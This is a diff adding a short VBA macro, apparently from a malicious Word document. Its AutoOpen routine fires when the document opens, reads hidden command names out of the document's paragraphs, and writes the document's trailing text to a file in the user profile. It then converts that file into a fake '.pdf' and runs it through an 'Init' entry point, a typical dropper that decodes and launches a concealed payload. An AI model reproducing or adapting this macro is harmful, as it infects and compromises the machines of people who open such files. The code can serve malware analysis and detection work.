@@ -1,0 +1,30 @@
+#If VBA7 Then
+Private Declare PtrSafe Function Sleep Lib "Kernel32" (ByVal One As Long) As Long
+#Else
+Private Declare Function Sleep Lib "Kernel32" (ByVal One As Long) As Long
+#End If
+Private SR1 As String
+Private SR3 As String
+Private SR4 As String
+Private SR5 As String
+Private STP As String
+
+Sub AutoOpen()
+    STP = Environ$("USERPROFILE") + "\ha1"
+    SR5 = Button_Click2(11, 11)
+    SR4 = Button_Click2(9, 16)
+    SR3 = Button_Click2(7, 8)
+    SR1 = Button_Click2(5, 22)
+    Set GG = CreateObject(SR1)
+    GG.create SR5 + " " + Button_Click3(aLENa) + "> " + STP + ".txt", Null, Null, Result1
+    GG.create SR4 + " " + STP + ".txt " + STP + ".pdf", Null, Null, Result2: Sleep 6000
+    GG.create SR3 + " " + STP + ".pdf,Init", Null, Null, Result3
+End Sub
+
+Function Button_Click2(One As Long, Two As Long) As String
+    Button_Click2 = Left(ActiveDocument.Paragraphs(One).Range.Text, Two)
+End Function
+
+Function Button_Click3(One As Long) As String
+     Button_Click3 = Right(ActiveDocument.Range.Text, One)
+End Function
